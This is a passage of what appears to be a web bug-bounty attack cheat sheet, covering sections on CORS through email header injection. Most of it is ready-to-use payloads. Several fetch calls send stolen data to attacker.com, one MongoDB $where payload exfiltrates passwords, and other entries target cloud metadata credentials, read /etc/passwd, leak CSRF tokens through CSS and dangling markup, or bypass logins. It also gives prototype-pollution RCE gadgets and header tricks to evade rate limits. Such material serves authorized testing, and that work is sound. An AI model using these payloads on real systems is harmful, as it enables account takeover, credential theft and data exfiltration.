  .then(r => r.json())
  .then(d => top.postMessage(JSON.stringify(d), '*'));
</script>"></iframe>
<script>
window.onmessage = e => fetch('https://attacker.com/?d=' + btoa(e.data));
</script>
```

### Subdomain Takeover + CORS Chain
```
1. Find CORS allows *.victim.com
2. Find dangling subdomain: old.victim.com → CNAME → expired cloud service
3. Take over old.victim.com
4. Host CORS exploit on old.victim.com
5. CORS allows it → read authenticated responses from victim.com
```

### Vary: Origin Missing
```bash
# If CORS response varies by Origin but Vary: Origin header is missing:
# CDN/proxy may cache response with one Origin's headers
# Serve cached response to different Origin = CORS bypass or cache poisoning
curl -H "Origin: https://evil.com" https://target.com/api/user -v
# Look for: Access-Control-Allow-Origin: https://evil.com
# Look for: Vary: Origin (should be present — if absent, report cache issue)
```

### Testing Checklist
```
[ ] Add Origin: https://evil.com to all API requests with credentials
[ ] Check if Access-Control-Allow-Origin reflects the Origin
[ ] Check if Access-Control-Allow-Credentials: true
[ ] Test Origin: null using sandboxed iframe PoC
[ ] Test subdomain variants: evil-victim.com, evilvictim.com
[ ] Test http:// vs https:// origin
[ ] Check Vary header — missing Vary: Origin + CORS = cache poisoning potential
[ ] Write PoC HTML that fetches authenticated endpoint
```

### Impact Chain
- CORS misconfig + credentials endpoint = **High** (account data theft)
- CORS misconfig + CSRF token endpoint = **High** (bypass CSRF protection)
- CORS misconfig + admin API = **Critical**
- CORS + subdomain takeover = **Critical**

---

## 32. INSECURE RANDOMNESS
> Predictable or weak random values in security-sensitive contexts.

### Root Cause
```javascript
// VULNERABLE — Math.random() is not cryptographically secure
const resetToken = Math.random().toString(36).substring(2);

// SECURE
const crypto = require('crypto');
const resetToken = crypto.randomBytes(32).toString('hex');
```

### PHP mt_rand Prediction
```php
// VULNERABLE — mt_rand seeded with timestamp
srand(time());  // or mt_srand(time())
$token = md5(rand());

// If attacker knows approximate time of token generation:
// Brute-force seed within ±30 second window → ~60 guesses
// Tools: php_mt_seed (https://www.openwall.com/php_mt_seed/)
```

### Timestamp-Based Token Analysis
```python
# Detect timestamp-based tokens
import base64, time, struct

# Check if token contains timestamp
token_bytes = base64.b64decode(token + '==')
# Look for 4-byte sequences that match recent unix timestamps
for i in range(len(token_bytes) - 3):
    val = struct.unpack('>I', token_bytes[i:i+4])[0]
    if abs(val - time.time()) < 3600:  # within 1 hour
        print(f"Possible timestamp at offset {i}: {val}")
```

### Sequential ID Detection
```bash
# If session tokens, reset tokens, or IDs appear sequential:
# Register account 1: token = abc123def456001
# Register account 2: token = abc123def456002  ← sequential counter!

# Tools: analyze with Burp Sequencer:
# Proxy → Intruder → Sequencer → analyze entropy
# FIPS tests: compression ratio, poker test, monobit test
```

### JavaScript Math.random() Attack
```javascript
// V8 Math.random() state can be recovered with enough outputs
// Tool: https://github.com/d0nutptr/v8_rand_buster
// 5 consecutive Math.random() calls → recover full XorShift128+ state → predict all future values
// Attack: if tokens are Math.random() based, predict future tokens
```

### Testing Checklist
```
[ ] Collect 20+ tokens (reset tokens, session IDs, invite codes)
[ ] Check Burp Sequencer entropy analysis
[ ] Look for patterns: sequential numbers, timestamps embedded
[ ] Decode base64 tokens, look for timestamp bytes
[ ] Check if token changes predictably between requests
[ ] Verify PRNG type: Math.random (JS), rand/mt_rand (PHP), random.random (Python)
[ ] Try to predict next token after observing several
[ ] Check UUIDs — UUID v1 contains timestamp + MAC address
```

### Impact Chain
- Weak password reset token + prediction = **Critical** (ATO)
- Weak session token + prediction = **Critical** (session hijack)
- Weak CSRF token + prediction = **High** (CSRF bypass)
- UUID v1 + timing = **High** (predict other users' tokens)

---

## 33. LDAP INJECTION
> Injecting LDAP filter metacharacters to bypass authentication or extract directory data.

### Root Cause
```python
# VULNERABLE — string concatenation in LDAP filter
def authenticate(username, password):
    filter = f"(&(uid={username})(userPassword={password}))"
    result = ldap.search(filter)
    return len(result) > 0

# Attacker input: username = "admin)(&)"
# Filter becomes: (&(uid=admin)(&)(userPassword=anything))
# (&) is always true → auth bypass!
```

### Authentication Bypass
```bash
# Classic LDAP auth bypass
username: admin)(&)
password: anything
# Filter: (&(uid=admin)(&)(userPassword=anything)) → always true

# Wildcard bypass
username: *
password: *
# Filter: (&(uid=*)(userPassword=*)) → matches any user!

# Null byte injection (for some implementations)
username: admin%00
```

### Blind LDAP Injection (Attribute Extraction)
```bash
# Extract attributes character by character using true/false responses
# Test: does filter (cn=a*) return results? → first char of cn is 'a'

# Automate with tool: ldapmap or manual boolean-based injection
# Inject into search fields, not just auth

# Payload for boolean extraction:
search_term = "test*)(|(objectClass=*)(cn=a*"
# If it returns results when first char is 'a' vs no results otherwise → blind injection
```

### Testing Checklist
```
[ ] Find login forms, search boxes backed by LDAP (common in enterprise/SSO)
[ ] Inject: * ) ( | & \
[ ] Test auth bypass: username=admin)(&) and username=*
[ ] Test search injection with wildcard: *
[ ] Look for verbose LDAP errors in responses
[ ] Test LDAP in SSO/directory search features
[ ] Try null byte in username field
```

### Payloads Reference
```
Auth bypass:    *)(|(uid=*
                admin)(&)(password=*
Wildcard:       *)
Always true:    *)(|(objectClass=*)
Attr extract:   targetAttr=a*)
```

### Impact Chain
- LDAP injection auth bypass = **Critical** (admin access without password)
- LDAP blind injection + user enumeration = **Medium**
- LDAP injection + attribute dump (emails, phone numbers) = **High**

---

## 34. NOSQL INJECTION EXPANDED
> MongoDB and other NoSQL databases have query operators that can be injected.

### Root Cause
```javascript
// VULNERABLE — object injection without sanitization
app.post('/login', async (req, res) => {
    const user = await User.findOne({
        username: req.body.username,  // if body is parsed as JSON object...
        password: req.body.password
    });
});
// POST body: {"username": "admin", "password": {"$gt": ""}}
// Query: {username: "admin", password: {$gt: ""}} → matches any password!
```

### Authentication Bypass
```bash
# JSON body injection (Content-Type: application/json)
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": null}}
{"username": "admin", "password": {"$exists": true}}
{"username": {"$regex": "admin"}, "password": {"$gt": ""}}

# Form body injection (Content-Type: application/x-www-form-urlencoded)
username=admin&password[$gt]=
username=admin&password[$ne]=invalid
username[$regex]=.*&password[$gt]=
```

### $where RCE (MongoDB)
```javascript
// $where evaluates JavaScript on server
db.users.find({$where: "this.username == '" + input + "'"})

// Injection:
input = "' || sleep(3000) || '"
// Causes 3 second delay → blind injection confirmed

input = "' || (function(){var x=new XMLHttpRequest(); x.open('GET','http://attacker.com/'+this.password,false); x.send(); return true;})() || '"
// Exfiltrates data via HTTP (if allowed)
```

### $regex DoS
```bash
# Complex regex on large collection = ReDoS on database
{"name": {"$regex": "^(a+)+$"}}
# With user-supplied patterns:
{"search": {"$regex": userInput}}
# Send: "^(a+)+$" or "(a|aa)+" → catastrophic backtracking in MongoDB JS engine
```

### Aggregation Pipeline Injection
```javascript
// If user input lands in $match stage of aggregation:
db.collection.aggregate([
    {$match: {status: userInput}},  // inject MongoDB operators here
    {$group: ...}
]);

// Inject: {"$gt": ""}  → match all documents regardless of status
```

### Testing Checklist
```
[ ] Change Content-Type to application/json if form-based
[ ] Inject {"$gt": ""} into password field
[ ] Try {"$ne": null} and {"$exists": true} variants
[ ] Test form-encoded: password[$gt]=
[ ] Test $where with sleep() for blind timing-based injection
[ ] Test search fields with {"$regex": ".*"} for data dump
[ ] Test $regex DoS with catastrophic backtracking pattern
[ ] Check error messages for MongoDB-specific errors (NoSQLi confirmed)
[ ] Try $lookup injection for cross-collection data access
```

### Impact Chain
- NoSQL auth bypass = **Critical** (login as any user)
- $where injection + sleep = **High** (blind injection, exfiltration possible)
- $regex DoS = **Medium** (denial of service)
- $lookup injection = **High** (cross-collection data access)

---

## 35. RATE LIMIT BYPASS
> Circumventing request frequency controls to enable brute-force, enumeration, or DoS.

### Root Cause
Rate limiters typically key on IP address, session, or user ID — each can be manipulated.

### IP Rotation Headers
```bash
# Backend trusts these headers for IP (each one may work)
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4
X-Cluster-Client-IP: 1.2.3.4
Forwarded: for=1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Host: 1.2.3.4

# Burp Intruder: set X-Forwarded-For as a payload position
# Payload type: Numbers (1.1.1.1 → 1.1.1.255 range)
```

### Endpoint and Parameter Variation
```bash
# Case variation
POST /api/login
POST /api/Login
POST /API/login
POST /Api/Login

# Trailing slash / path segment
POST /api/login/
POST /api/login/.
POST /api//login

# Parameter padding (adds unique param to avoid deduplication)
POST /api/login?x=1
POST /api/login?x=2
POST /api/login?_=random_value

# Null byte
POST /api/login%00
```

### HTTP Method and Version Bypass
```bash
# Try different HTTP methods
GET → POST → PUT → OPTIONS
# Try HTTP/1.0 vs HTTP/1.1 (different counters)
HTTP/1.0

# API version swap
/v1/login → /v2/login → /v3/login → /api/login

# Content-Type variation
application/json → application/x-www-form-urlencoded → multipart/form-data
```

### GraphQL Alias Flooding
```graphql
# Each alias executes independently — bypass 1-per-request rate limits
mutation {
  a1: login(username: "admin", password: "pass1") { token }
  a2: login(username: "admin", password: "pass2") { token }
  a3: login(username: "admin", password: "pass3") { token }
  # ... 100 aliases in one request
}
```

### Testing Checklist
```
[ ] Find rate-limited endpoint (OTP, login, password reset, 2FA)
[ ] Add X-Forwarded-For: 1.1.1.X with X as Burp payload
[ ] Try True-Client-IP, X-Real-IP variants
[ ] Test endpoint path variations (case, trailing slash, path param)
[ ] Add random query parameter to each request
[ ] Try GraphQL alias flooding for batched brute-force
[ ] Test null byte in path: /login%00
[ ] Test HTTP/1.0 vs HTTP/1.1
[ ] Test different Content-Types
[ ] Test API version variations
```

### Impact Chain
- Rate limit bypass + OTP brute = **Critical** (2FA bypass)
- Rate limit bypass + password brute = **Critical** (ATO)
- Rate limit bypass + account enumeration = **Medium**
- Rate limit bypass + GraphQL alias = **High** (batched attacks)

---

## 36. CLICKJACKING ADVANCED
> Tricking users into clicking elements on an invisible iframe overlay.

### Root Cause
```html
<!-- Attacker page overlays victim site in transparent iframe -->
<style>
iframe {
    position: absolute;
    width: 500px; height: 300px;
    opacity: 0.0001;  /* invisible! */
    z-index: 1;
}
button.decoy { position: absolute; z-index: 0; }
</style>
<button class="decoy">Click here to claim prize!</button>
<iframe src="https://victim.com/delete-account?confirm=true"></iframe>
```

### X-Frame-Options Bypass
```bash
# X-Frame-Options: ALLOW-FROM only works in specific browsers (IE/FF only)
# Chrome ignores ALLOW-FROM — clickjackable in Chrome even with ALLOW-FROM
# Check header: X-Frame-Options: ALLOW-FROM https://trusted.com
# Bypass: use Chrome browser for clickjacking → ALLOW-FROM ignored!

# Partial URL match bug (old implementations)
# ALLOW-FROM https://evil.victim.com  ← if regex-based and allows subdomains
```

### CSP frame-ancestors Bypass
```bash
# Misconfigured frame-ancestors
Content-Security-Policy: frame-ancestors 'self' https://*.victim.com

# If attacker controls *.victim.com subdomain (subdomain takeover):
# Host clickjacking PoC on evil.victim.com → CSP allows it!

# Double framing (legacy bypass for XFO DENY):
# Frame an intermediate page that itself frames the victim
# Only works if intermediate doesn't have X-Frame-Options
```

### Drag-and-Drop Clickjacking
```html
<!-- Steal clipboard/file content without click — just drag -->
<div id="drag-target" style="opacity:0.0001; position:absolute;">
  <iframe src="https://victim.com/export-api-key"></iframe>
</div>
<div id="drop-zone">Drop your file here!</div>
<script>
  // Position iframe so sensitive text falls on drag start point
  // User drags "file" but actually drags victim's API key text
</script>
```

### Cursor Hijacking
```css
/* CSS cursor property can show fake cursor offset from real cursor */
* { cursor: url('fake-cursor.png') 100 100, auto; }
/* Real click is 100px away from where cursor appears to be */
```

### Testing Checklist
```
[ ] Check X-Frame-Options header (missing or ALLOW-FROM = potential vuln)
[ ] Check CSP frame-ancestors (missing or too broad)
[ ] Build basic PoC: iframe victim page, confirm it loads
[ ] Test state-changing actions: delete, transfer, settings change
[ ] Test X-Frame-Options: ALLOW-FROM specifically in Chrome
[ ] Check for subdomain that could frame via CSP wildcard
[ ] Test double-framing for DENY bypass
[ ] Confirm sensitive action happens without user realizing
```

### Impact Chain
- Clickjacking + account deletion = **High**
- Clickjacking + fund transfer = **Critical**
- Clickjacking + admin action = **High**
- Drag-and-drop + token exfil = **High**

---

## 37. CRLF INJECTION
> Injecting carriage return (\r, %0d) and line feed (\n, %0a) into headers to split responses or inject new headers.

### Root Cause
```python
# VULNERABLE — user input in Location header without stripping CRLF
@app.route('/redirect')
def redirect():
    url = request.args.get('url')
    return redirect(url)  # url may contain \r\n!

# Payload: /redirect?url=https://victim.com%0d%0aSet-Cookie:%20session=evil
# Response:
# HTTP/1.1 302 Found
# Location: https://victim.com
# Set-Cookie: session=evil   ← injected!
```

### Header Injection
```bash
# Inject arbitrary headers
GET /path?param=value%0d%0aX-Injected-Header:%20evil HTTP/1.1

# Set cookie (session fixation / cookie injection)
GET /redirect?url=https://safe.com%0d%0aSet-Cookie:%20auth=evil;%20HttpOnly HTTP/1.1

# XSS via Content-Type injection
GET /page?name=test%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### Response Splitting
```bash
# Inject double CRLF to start a second HTTP response body
# Classic: inject into Location or other headers
GET /redirect?url=a%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
# Splits response — browser processes second fake response as if legitimate
```

### Log Injection
```bash
# Inject CRLF into log entries to forge log lines
GET /page?user=admin%0a[2024-01-01]%20INFO:%20Successful%20admin%20login%20from%20127.0.0.1
# Log file now shows forged entry from 127.0.0.1
```

### Email Header Injection
```bash
# Contact form "From" field injection
From: victim@email.com%0aCc:%20attacker@evil.com
From: victim@email.com%0aBcc:%20attacker@evil.com%0a

# Subject injection
Subject: Hello%0aContent-Type:%20text/html%0a%0a<script>alert(1)</script>
```

### Testing Checklist
```
[ ] Inject %0d%0a into all redirect parameters
[ ] Test URL parameters that appear in response headers
[ ] Test User input reflected in Location, Content-Disposition, Set-Cookie
[ ] Try %0a alone (LF without CR) — some servers only check CR
[ ] Test email fields in contact/registration forms
[ ] Try Unicode CRLF: %e5%98%8a%e5%98%8d (U+560A U+560D)
[ ] Check Nginx/Apache logs for reflected injected values
```

### Impact Chain
- CRLF + Set-Cookie = **High** (session fixation, cookie injection)
- CRLF + response splitting = **High** (XSS delivery)
- CRLF + email header injection = **Medium** (spam abuse)
- CRLF + log injection = **Medium** (audit trail forgery)

---

## 38. WEB CACHE DECEPTION
> Tricking a CDN/cache into storing a page with sensitive user data, then retrieving it unauthenticated.

### Root Cause
Cache serves pages based on URL path — if path manipulation makes a dynamic authenticated page look like a static asset, it gets cached publicly.

### Step-by-Step PoC
```
1. Log in as victim
2. Visit: https://target.com/account/profile/nonexistent.css
3. Server ignores .css suffix (returns profile page with victim's data)
4. CDN sees .css → caches it (static asset rule)
5. Log out (or use incognito)
6. Visit same URL: https://target.com/account/profile/nonexistent.css
7. CDN serves cached page → victim's profile data exposed!
```

### Path Confusion Variants
```bash
# Static extension suffix
/account/profile.css
/account/profile.js
/account/profile.ico
/account/profile.png
/account/profile.woff

# Path segment addition
/account/profile/test.css
/account/profile/..%2ftest.js
/account/settings;.js    # semicolon-based path confusion

# Nginx off-by-slash (classic)
# Nginx: location /static { ... }
# Request: /staticPROFILE  ← matches /static prefix! returns dynamic content
```

### Parameter-Based Cache Deception
```bash
# Some caches cache based on path only, ignoring query params
# Attacker: /api/user?cachebuster=123 → server returns user data
# CDN: path is /api/user, ignores query → caches under /api/user
# Attacker #2 retrieves cached /api/user without auth

# Cache key normalization attacks
/api/user?a=1 vs /api/user  (may hit same cache entry)
```

### CDN-Specific Tricks
```bash
# Cloudflare — default cached extensions
.jpg .jpeg .png .gif .ico .css .js .woff .woff2 .ttf .eot .svg

# Akamai — default cached based on no-cache headers
# Test: send request to /account/profile.jpg
# Check X-Cache or CF-Cache-Status header for HIT

# CloudFront — path-based forwarding with wildcard misconfig
```

### Testing Checklist
```
[ ] Identify authenticated pages with sensitive data (profile, account, orders)
[ ] Append static extension: /account.css, /account/profile.js
[ ] Check Cache-Control and X-Cache headers in response
[ ] In second browser (no auth): visit same URL, check if data appears
[ ] Test with Burp — compare authenticated vs unauthenticated response
[ ] Try path segment addition: /account/profile/x.css
[ ] Test semicolon bypass: /account;.css
[ ] Check CDN behavior with static extension
```

### Impact Chain
- Cache deception + PII page = **High** (data exposure)
- Cache deception + CSRF token page = **High** (CSRF bypass)
- Cache deception + admin panel = **Critical**

---

## 39. SERVER-SIDE PROTOTYPE POLLUTION
> (Expanded from class 22) Specific server-side gadgets and detection techniques.

### Detection Without Side Effects (Safe Gadgets)
```bash
# Status code override — does JSON response status change?
POST /api/data
{"__proto__": {"status": 555}}
# If response is HTTP 555 → SSPP confirmed

# JSON formatting — does response indentation change?
POST /api/data
{"__proto__": {"json spaces": "    "}}
# If response is now pretty-printed with 4-space indent → confirmed

# Content-Type override
POST /api/data
{"__proto__": {"content-type": "text/html; charset=utf-8"}}
# If Content-Type response header changes → confirmed

# exposedHeaders in CORS
POST /api/data
{"__proto__": {"exposedHeaders": ["X-Injected"]}}
# If Access-Control-Expose-Headers: X-Injected appears → confirmed
```

### Constructor Prototype (Alternative Path)
```json
{"constructor": {"prototype": {"isAdmin": true}}}
{"constructor": {"prototype": {"status": 555}}}
```

### Escalation to RCE
```javascript
// Via child_process (if app spawns processes)
{"__proto__": {"shell": "/proc/self/exe", "argv0": "nodejs", "env": {"NODE_OPTIONS": "--require /proc/self/fd/0"}}}

// Via template engines (if Pug/Jade used)
{"__proto__": {"defaultEngine": "pug", "ext": ".pug", "compileDebug": true, "debug": true}}

// Via require resolution hijacking
{"__proto__": {"main": "/proc/self/fd/0"}}
```

### Testing Checklist
```
[ ] POST JSON body with __proto__ pollution to all endpoints
[ ] Try constructor.prototype variant
[ ] Test all three safe detection gadgets (status, json spaces, content-type)
[ ] If confirmed: escalate with shell/spawn gadgets
[ ] Test URL-encoded body: __proto__[status]=555
[ ] Test query string: ?__proto__[status]=555
[ ] Test nested objects: {"a":{"__proto__": {"status":555}}}
```

---

## 40. POSTMESSAGE VULNERABILITIES
> Cross-window communication via postMessage without origin validation allows data theft or arbitrary JS execution.

### Root Cause
```javascript
// VULNERABLE — no origin check
window.addEventListener('message', function(event) {
    // Never checks event.origin!
    document.getElementById('output').innerHTML = event.data;  // XSS gadget!
    eval(event.data);  // RCE gadget
    location.href = event.data;  // Open redirect gadget
});

// SECURE
window.addEventListener('message', function(event) {
    if (event.origin !== 'https://trusted.partner.com') return;
    // process event.data
});
```

### Missing Origin Validation
```html
<!-- Attacker iframe exploit -->
<iframe id="victim" src="https://target.com/app"></iframe>
<script>
document.getElementById('victim').onload = function() {
    // Send message to victim's window — if no origin check, it's processed!
    document.getElementById('victim').contentWindow.postMessage(
        '{"action":"transfer","amount":1000,"to":"attacker"}',
        '*'  // '*' means any origin
    );
};
</script>
```

### postMessage to opener
```javascript
// If page opened via window.open() and posts messages back to opener:
// Attacker opens victim as popup, intercepts messages
var popup = window.open('https://target.com/oauth/callback');
window.addEventListener('message', function(e) {
    // Capture OAuth tokens, auth codes, sensitive data
    fetch('https://attacker.com/?token=' + JSON.stringify(e.data));
});
```

### JS Source Analysis Pattern
```bash
# Grep for postMessage listeners without origin check
grep -r "addEventListener.*message" --include="*.js" -A5
# Look for missing: event.origin check before processing event.data

# Grep for dangerous sinks after postMessage
grep -r "innerHTML.*event.data\|eval.*event.data\|location.*event.data" --include="*.js"

# Grep for postMessage senders
grep -r "\.postMessage(" --include="*.js" | grep -v "origin"
```

### Testing Checklist
```
[ ] Search JS files for addEventListener('message', ...) without origin check
[ ] Identify what happens with event.data (sinks: eval, innerHTML, location)
[ ] Build PoC that sends postMessage from attacker domain
[ ] Test popup-based postMessage if app uses window.open for OAuth
[ ] Check if app posts sensitive data (tokens, PII) via postMessage
[ ] Test wildcard targetOrigin '*' in postMessage calls
[ ] Check iframe embed flows that use postMessage for communication
```

### Impact Chain
- postMessage + innerHTML = **High** (XSS)
- postMessage + eval = **Critical** (JS execution)
- postMessage + OAuth token interception = **Critical** (ATO)
- postMessage + redirect = **Medium** (phishing)

---

## 41. CSS INJECTION
> Injecting CSS to exfiltrate data without JavaScript — useful in strict CSP environments.

### Root Cause
```css
/* If user-controlled input appears in a <style> tag or style attribute: */
/* Attacker input: */
} body { background: url('https://attacker.com/?leak=gotcha') {

/* Or in attribute selector context: exfiltrate attribute values char by char */
input[value^="a"] { background: url('https://attacker.com/?c=a') }
input[value^="b"] { background: url('https://attacker.com/?c=b') }
/* Loads attacker URL only when value starts with matching char */
```

### Attribute Value Extraction
```css
/* Exfiltrate CSRF token from hidden input character by character */
/* Send each possible first character: */
input[name="csrf"][value^="a"] { background: url('https://attacker.com/css?c=a') }
input[name="csrf"][value^="b"] { background: url('https://attacker.com/css?c=b') }
/* ... a-z, A-Z, 0-9 (62 requests per character position) */
/* Repeat for second character using confirmed first char as prefix */
```

### CSS Keylogging
```css
/* Log keystrokes via CSS animation on focus */
input[type="password"]:focus ~ * { background: url('https://attacker.com/focus') }

/* Character-by-character via input value selectors (with JS-free approach) */
/* Auto-submit forms or trigger requests based on CSS selector matches */
```

### Data Exfiltration via @import
```css
/* Recursive CSS import to exfiltrate */
@import url('https://attacker.com/next?prefix=a');
/* Attacker returns CSS that loads next character check */
/* Chains to recover full token */
```

### Testing Checklist
```
[ ] Find where user input appears inside <style> tags
[ ] Find where user input appears in style= attributes
[ ] Check if CSP blocks JavaScript but allows CSS (common configuration)
[ ] Test CSS injection with: }body{background:url(//attacker.com)}
[ ] Test attribute selector on forms with sensitive hidden fields
[ ] Check if @import is allowed (enables data exfiltration chain)
[ ] Look for CSS-in-JS patterns (styled-components with user input)
```

### Impact Chain
- CSS injection + CSRF token extraction = **High** (CSRF bypass)
- CSS injection + password field + no JS CSP = **High** (keylogging)
- CSS injection + hidden field extraction = **Medium–High**

---

## 42. DANGLING MARKUP INJECTION
> Injecting incomplete HTML tags to exfiltrate data through browser behavior.

### Root Cause
```html
<!-- App reflects user input inside HTML but sanitizes scripts/events -->
<!-- Input: "><img src='https://attacker.com/?data= -->
<!-- Page becomes: -->
<div class="welcome">"><img src='https://attacker.com/?data=
  <!-- everything up to next ' is sent as URL parameter! -->
  <input name="csrf" value="SECRET_TOKEN_123">
</div>
<!-- Browser loads: https://attacker.com/?data=...csrf token...input... -->
```

### Image Tag Exfiltration
```html
<!-- Dangling img src collects everything until next quote -->
"><img src='https://attacker.com/collect?data=

<!-- Dangling href collects everything until next quote -->
"><a href='https://attacker.com/collect?data=

<!-- Target data that gets caught in the URL: -->
<!-- CSRF tokens, session data, hidden form values, email addresses -->
```

### Content Security Policy Bypass
```html
<!-- Even with script-src 'none', this works via img src! -->
<!-- No JavaScript needed — purely HTML attribute exfiltration -->
<!-- Works when: -->
<!-- 1. Input reflected in HTML body -->
<!-- 2. HTML tags sanitized but incomplete tags bypass regex sanitizer -->
<!-- 3. CSP blocks all scripts but allows images -->
```

### Testing Checklist
```
[ ] Find reflection points where HTML is returned (not JSON API)
[ ] Test: "><img src='https://attacker.com/?x= — check server logs
[ ] Check if Content-Security-Policy has strict connect-src but allows img-src
[ ] Test in body, attributes, and script-adjacent contexts
[ ] Confirm data appears in attacker's URL after page loads
[ ] Try in stored reflection (email, name, profile fields)
[ ] Useful specifically when CSP blocks script/eval
```

### Impact Chain
- Dangling markup + CSRF token = **High** (CSRF bypass without JS)
- Dangling markup + auth token in page = **Critical** (token theft)
- Dangling markup + password in page = **Critical**

---

## 43. REQUEST SPLITTING / SSRF VIA PARSER DIFFERENTIALS
> Frontend and backend URL parsers disagree on what a URL means — attacker exploits the gap.

### Root Cause
```
Frontend proxy parses URL one way, backend another:
https://target.com/api/v1/../admin  → Proxy: /api/v1/../admin
                                     → Backend (normalizes): /admin
If proxy checks access to /api/v1/ but backend serves /admin → access bypass!
```

### URL Parser Confusion
```bash
# Backend origin bypass
https://attacker.com#@victim.com/path        # Python urlparse: host=victim.com
https://attacker.com\@victim.com/path        # Some parsers: host=victim.com
https://user@victim.com:80@attacker.com/path # host=attacker.com to some parsers

# Path confusion
https://target.com/app?url=https://attacker.com/..%2f..%2fapi/admin
https://target.com/app?url=https://attacker.com%252f%252e%252e%252fadmin

# Percent-encoding in host
https://target.com%2f.evil.com/path  # some parsers decode host
```

### Unicode Normalization Attacks
```bash
# Unicode characters that normalize to /
# U+FF0F FULLWIDTH SOLIDUS → /
# U+2215 DIVISION SLASH → /
# U+29F8 BIG SOLIDUS → /

curl 'https://target.com/app%EF%BC%8Fetc%EF%BC%8Fpasswd'
# If backend normalizes Unicode before routing → path traversal!
```

### SSRF via Redirect Chain
```bash
# App validates URL before redirect: must start with https://
# Attacker controls redirect: https://attacker.com → 302 → http://169.254.169.254
# Validator checks first URL (passes), fetcher follows redirect (internal!)
```

### Testing Checklist
```
[ ] Test URL parameters with /.. path normalization
[ ] Test unicode path separators
[ ] Test host confusion: user@host:port@evil patterns
[ ] Test SSRF through redirects
[ ] Compare frontend vs backend parsing behavior manually
[ ] Use Burp decoder to try various encoding combinations
```

---

## 44. ESI INJECTION
> Edge Side Includes — server-side template injection in CDN/caching layer.

### Root Cause
```xml
<!-- ESI is processed by caching servers (Varnish, Squid, Akamai) before delivery -->
<!-- If user input is reflected in a cached template: -->
<b>Welcome back, <esi:include src="http://attacker.com/evil"/></b>
<!-- ESI processor fetches attacker.com/evil and inlines the response! -->
```

### Detection
```bash
# Inject ESI tag into user-controlled field
# If server processes ESI, tag disappears from response (consumed by ESI processor)
<esi:include src="http://attacker.com/detect"/>

# Check Burp Collaborator for incoming HTTP request from target's ESI processor
# If request arrives: ESI injection confirmed!

# Fingerprint ESI processor
<esi:vars>$(HTTP_HOST)</esi:vars>
# Returns hostname if processed

# Blind detection via timing
<esi:include src="http://attacker.com/slow"/> 
# Adds delay if ESI processor fetches synchronously
```

### SSRF via ESI
```xml
<!-- Read internal service -->
<esi:include src="http://internal-service:8080/admin"/>

<!-- Cloud metadata -->
<esi:include src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
```

### XSS via ESI
```xml
<!-- If ESI processes in HTML context and output is not encoded -->
<esi:include src="https://attacker.com/xss.html"/>
<!-- attacker.com/xss.html returns: <script>alert(document.domain)</script> -->
```

### ESI Conditional XSS (bypassing sanitization)
```xml
<!-- Varnish ESI — vars and conditionals -->
<esi:vars>$add_header('X-Evil', 'value')</esi:vars>
<esi:choose>
  <esi:when test="$(QUERY_STRING{'xss'})=='1'">
    <script>alert(1)</script>
  </esi:when>
</esi:choose>
```

### Testing Checklist
```
[ ] Inject <esi:include src="//attacker.burpcollaborator.net/"> into any user field
[ ] Check Collaborator for server-side HTTP request (ESI confirmed)
[ ] Test in user-agent, headers, form fields, profile fields
[ ] If confirmed: attempt SSRF to internal services
[ ] Try ESI include of metadata endpoint
[ ] Check if ESI vars expressions execute: <esi:vars>$(HTTP_HOST)</esi:vars>
[ ] Test in HTTP headers (ESI sometimes processes header values)
```

### Impact Chain
- ESI + SSRF to metadata = **Critical**
- ESI + XSS in cached response = **High**
- ESI + internal service access = **High**

---

## 45. PDF GENERATION SSRF / XSS
> HTML-to-PDF converters execute embedded HTML/JS, enabling SSRF, local file read, and stored XSS.

### Root Cause
```
App uses server-side HTML-to-PDF engine (wkhtmltopdf, Puppeteer, Prince, Headless Chrome).
If user-supplied HTML reaches the renderer without sanitization:
- <script> executes server-side JS (Puppeteer/headless)
- <iframe> fetches remote/local URLs
- file:// protocol reads local files
```

### wkhtmltopdf Exploits
```html
<!-- Local file read via iframe -->
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>

<!-- SSRF via external resource -->
<img src="http://169.254.169.254/latest/meta-data/">

<!-- Local file via link tag -->
<link rel="stylesheet" href="file:///etc/passwd">

<!-- JS-based SSRF (if JS enabled via --enable-javascript) -->
<script>
var x = new XMLHttpRequest();
x.open('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', false);
x.send();
document.write(x.responseText);
</script>
```

### Puppeteer / Headless Chrome Exploits
```javascript
// Stored XSS in generated PDF
// If PDF content is HTML-rendered with puppeteer and stored:
<script>
fetch('http://169.254.169.254/latest/meta-data/')
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/?d=' + btoa(d)));
</script>

// Local file protocol (may be blocked)
<iframe src="file:///etc/passwd"></iframe>
```

### Detection Payload
```html
<!-- Inject into any field that ends up in PDF -->
<script>document.write('<img src="https://attacker.burpcollaborator.net/test">')</script>

<!-- Or without JS (for wkhtmltopdf without JS): -->
<img src="https://attacker.burpcollaborator.net/detect">
```

### Testing Checklist
```
[ ] Find any PDF/report generation feature
[ ] Identify user-controlled input in generated PDF
[ ] Inject <img src="//attacker.burpcollaborator.net/detect">
[ ] Check Collaborator for incoming request (confirms PDF renderer fetches URLs)
[ ] If confirmed: try file:///etc/passwd via iframe
[ ] Try metadata endpoint via img/iframe src
[ ] If JS enabled: try fetch-based SSRF
[ ] Test in invoice, report, receipt, CV/resume upload features
```

### Impact Chain
- PDF SSRF + metadata = **Critical** (cloud key exfil)
- PDF file read + /etc/passwd = **Medium**
- PDF file read + private key / .env = **Critical**
- PDF stored XSS = **Medium–High** (depends on viewer)

---

## 46. EMAIL HEADER INJECTION
> Injecting SMTP headers via user-controlled form fields.

### Root Cause
```python
# VULNERABLE — user input directly in email headers
import smtplib

def send_contact(name, email, message):
    msg = f"From: {email}\nTo: admin@target.com\nSubject: Contact\n\n{message}"
    server.sendmail(email, 'admin@target.com', msg)
    # If email = "a@b.com\nBcc: victim1@evil.com" → adds BCC header!
```

### CC / BCC Injection
```bash
# From field injection (contact form)
